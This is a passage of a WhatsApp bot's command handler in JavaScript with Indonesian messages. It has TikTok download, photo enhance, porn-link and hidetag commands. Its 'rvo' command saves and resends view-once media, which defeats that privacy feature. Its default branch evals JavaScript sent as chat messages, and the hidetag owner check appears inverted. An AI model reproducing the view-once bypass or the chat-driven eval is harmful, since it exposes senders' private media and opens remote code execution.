text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await rayz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await rayz.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await rayz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
///////=====================////////////
case "tohd": case "hd": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await rayz.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await rayz.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break
////=================///////
case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return rayz.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return rayz.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return rayz.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
////==============Case Bokep ////////
case "bokep": {
  m.reply(`*- Harap kecilkan volume*\n • link nonton : ${randomLink}`);
  }
break 
case "ht": case "hidetag": {
if (isOwner) return Reply("kamu bukan Owner")
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await rayz.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});